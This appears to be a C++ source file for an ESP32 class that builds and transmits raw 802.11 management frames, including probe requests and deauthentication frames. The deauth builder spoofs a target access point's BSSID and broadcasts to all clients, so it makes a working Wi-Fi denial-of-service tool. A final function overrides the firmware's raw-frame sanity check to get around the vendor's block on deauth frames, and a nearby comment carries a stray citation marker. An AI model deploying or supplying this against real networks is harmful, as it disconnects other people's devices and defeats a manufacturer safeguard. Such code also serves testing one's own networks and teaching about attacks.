#include "../../include/wifi/WifiTransmitter.hpp"

#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>

bool WifiTransmitter::begin()
{
  if (initialized)
  {
    return true;
  }

  if (!WiFi.mode(WIFI_STA))
  {
    return false;
  }

  WiFi.disconnect();

  initialized = true;

  if (!setChannel(currentChannel))
  {
    initialized = false;
    return false;
  }

  resetStats();

  return true;
}

bool WifiTransmitter::isReady() const
{
  return initialized;
}

bool WifiTransmitter::setChannel(uint8_t channel)
{
  if (!initialized)
  {
    return false;
  }

  if (!isValidChannel(channel))
  {
    return false;
  }

  esp_err_t result =
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  if (result != ESP_OK)
  {
    return false;
  }

  currentChannel = channel;
  stats.channel = channel;

  return true;
}

uint8_t WifiTransmitter::getChannel() const
{
  return currentChannel;
}

bool WifiTransmitter::sendProbeRequest(const char* ssid)
{
  if (!initialized || ssid == nullptr)
  {
    return false;
  }

  uint8_t frame[MAX_FRAME_SIZE] = {};

  size_t frameLength =
    buildProbeRequest(
      frame,
      sizeof(frame),
      ssid
    );

  if (frameLength == 0)
  {
    return false;
  }

  return sendRawFrame(frame, frameLength);
}

bool WifiTransmitter::sendDeauth(const uint8_t* targetBssid, uint16_t reasonCode)
{
  if (!initialized || targetBssid == nullptr)
  {
    return false;
  }

  uint8_t frame[64] = {};

  size_t frameLength =
    buildDeauth(
      frame,
      sizeof(frame),
      targetBssid,
      reasonCode
    );

  if (frameLength == 0)
  {
    return false;
  }

  return sendRawFrame(frame, frameLength);
}

bool WifiTransmitter::parseMac(const String& mac, uint8_t out[6])
{
  if (out == nullptr || mac.length() != 17)
  {
    return false;
  }

  unsigned int values[6];

  if (
    sscanf(
      mac.c_str(),
      "%x:%x:%x:%x:%x:%x",
      &values[0], &values[1], &values[2],
      &values[3], &values[4], &values[5]
    ) != 6
  )
  {
    return false;
  }

  for (int i = 0; i < 6; i++)
  {
    out[i] = static_cast<uint8_t>(values[i]);
  }

  return true;
}

WifiTxStats WifiTransmitter::getStats() const
{
  WifiTxStats snapshot = stats;

  snapshot.channel = currentChannel;

  return snapshot;
}

void WifiTransmitter::resetStats()
{
  stats.attemptedFrames = 0;
  stats.sentFrames = 0;
  stats.failedFrames = 0;

  stats.channel = currentChannel;
}

bool WifiTransmitter::sendRawFrame(const uint8_t* frame, size_t length)
{
  if (!initialized || frame == nullptr || length == 0)
  {
    return false;
  }

  stats.attemptedFrames++;

  esp_err_t result =
    esp_wifi_80211_tx(
      WIFI_IF_STA,
      frame,
      length,
      false
    );

  if (result == ESP_OK)
  {
    stats.sentFrames++;
    return true;
  }

  stats.failedFrames++;

  return false;
}

size_t WifiTransmitter::buildProbeRequest(
  uint8_t* buffer,
  size_t bufferSize,
  const char* ssid
)
{
  if ( buffer == nullptr || ssid == nullptr)
  {
    return 0;
  }

  size_t ssidLength = std::strlen(ssid);

  /*
   * IEEE 802.11 SSID maximum length.
   */
  if (ssidLength > 32)
  {
    return 0;
  }

  /*
   * Probe Request:
   *
   * 24 bytes MAC header
   * 2 + SSID length
   * 2 + 8 supported rates
  */
  constexpr size_t HEADER_SIZE = 24;
  constexpr size_t SUPPORTED_RATES_SIZE = 8;

  size_t requiredSize =
    HEADER_SIZE + 2 + ssidLength + 2 + SUPPORTED_RATES_SIZE;

  if (requiredSize > bufferSize)
  {
    return 0;
  }

  uint8_t sourceMac[6];

  if (!getSourceMac(sourceMac))
  {
    return 0;
  }

  std::memset(
    buffer,
    0,
    requiredSize
  );

  /*
   * Frame Control
   *
   * Type: Management
   * Subtype: Probe Request
   *
   * Little endian:
   * 0x0040
  */
  buffer[0] = 0x40;
  buffer[1] = 0x00;

  /*
   * Duration
  */
  buffer[2] = 0x00;
  buffer[3] = 0x00;

  /*
   * Destination Address:
   * FF:FF:FF:FF:FF:FF
  */
  std::memset(
    buffer + 4,
    0xFF,
    6
  );

  /*
   * Source Address:
   * ESP32 station MAC.
  */
  std::memcpy(
    buffer + 10,
    sourceMac,
    6
  );

  /*
   * BSSID:
   * FF:FF:FF:FF:FF:FF
   *
   * Probe Request is not associated
   * with a specific BSSID here.
  */
  std::memset(
    buffer + 16,
    0xFF,
    6
  );

  /*
   * Sequence Control
   *
   * Bits 4..15 = sequence number
   * Bits 0..3  = fragment number
  */
  uint16_t sequenceControl =
    static_cast<uint16_t>(
      nextSequenceNumber() << 4
    );

  buffer[22] = static_cast<uint8_t>(sequenceControl & 0xFF);

  buffer[23] = static_cast<uint8_t>((sequenceControl >> 8) & 0xFF);

  size_t offset = HEADER_SIZE;

  /*
   * SSID Information Element
   *
   * ID = 0
  */
  buffer[offset++] = 0x00;

  buffer[offset++] = static_cast<uint8_t>(ssidLength);

  if (ssidLength > 0)
  {
    std::memcpy(
      buffer + offset,
      ssid,
      ssidLength
    );

    offset += ssidLength;
  }

  /*
   * Supported Rates Information Element
   *
   * ID = 1
  */
  buffer[offset++] = 0x01;
  buffer[offset++] = SUPPORTED_RATES_SIZE;

  constexpr uint8_t supportedRates[
    SUPPORTED_RATES_SIZE
  ] = {
    0x82, // 1 Mbps, basic
    0x84, // 2 Mbps, basic
    0x8B, // 5.5 Mbps, basic
    0x96, // 11 Mbps, basic
    0x0C, // 6 Mbps
    0x12, // 9 Mbps
    0x18, // 12 Mbps
    0x24  // 18 Mbps
  };

  std::memcpy(
    buffer + offset,
    supportedRates,
    SUPPORTED_RATES_SIZE
  );

  offset += SUPPORTED_RATES_SIZE;

  return offset;
}

size_t WifiTransmitter::buildDeauth(
  uint8_t* buffer,
  size_t bufferSize,
  const uint8_t* targetBssid,
  uint16_t reasonCode
)
{
  if (buffer == nullptr || targetBssid == nullptr)
  {
    return 0;
  }

  /*
   * Deauthentication frame:
   *
   * 24 bytes MAC header
   * 2  bytes Reason Code
   */
  constexpr size_t DEAUTH_SIZE = 26;

  if (bufferSize < DEAUTH_SIZE)
  {
    return 0;
  }

  uint8_t sourceMac[6];

  if (!getSourceMac(sourceMac))
  {
    return 0;
  }

  std::memset(buffer, 0, DEAUTH_SIZE);

  /*
   * Frame Control
   *
   * Type: Management (0)
   * Subtype: Deauthentication (12 / 0x0C)
   *
   * Little endian: 0x00C0
  */
  buffer[0] = 0xC0;
  buffer[1] = 0x00;

  /*
   * Duration
  */
  buffer[2] = 0x00;
  buffer[3] = 0x00;

  /*
   * Destination Address (broadcast)
  */
  std::memset(
    buffer + 4,
    0xFF,
    6
  );

  /*
   * Source Address (AP / target BSSID)
  */
  std::memcpy(
    buffer + 10,
    targetBssid,
    6
  );

  /*
   * BSSID
  */
  std::memcpy(
    buffer + 16,
    targetBssid,
    6
  );

  /*
   * Sequence Control
  */
  uint16_t sequenceControl =
    static_cast<uint16_t>(
      nextSequenceNumber() << 4
    );

  buffer[22] = static_cast<uint8_t>(sequenceControl & 0xFF);
  buffer[23] = static_cast<uint8_t>((sequenceControl >> 8) & 0xFF);

  /*
   * Reason Code (little-endian)
  */
  buffer[24] = static_cast<uint8_t>(reasonCode & 0xFF);
  buffer[25] = static_cast<uint8_t>((reasonCode >> 8) & 0xFF);

  return DEAUTH_SIZE;
}

bool WifiTransmitter::getSourceMac(uint8_t* mac) const
{
  if (mac == nullptr)
  {
    return false;
  }

  esp_err_t result = esp_wifi_get_mac(WIFI_IF_STA, mac);

  return result == ESP_OK;
}

bool WifiTransmitter::isValidChannel(uint8_t channel) const
{
  return channel >= MIN_CHANNEL && channel <= MAX_CHANNEL;
}

uint16_t WifiTransmitter::nextSequenceNumber()
{
  uint16_t current = sequenceNumber;

  sequenceNumber = (sequenceNumber + 1) & 0x0FFF;

  return current;
}

extern "C" int ieee80211_raw_frame_sanity_check(
    int32_t arg,
    int32_t arg2,
    int32_t arg3
)
{
    // Returning 0 allows all raw frame types, including deauth
    // The if (arg == 31337) return 1 path is an optional legacy marker
    // to verify whether the override was successfully linked[citation:2]
    (void)arg2;
    (void)arg3;
    return 0;
}
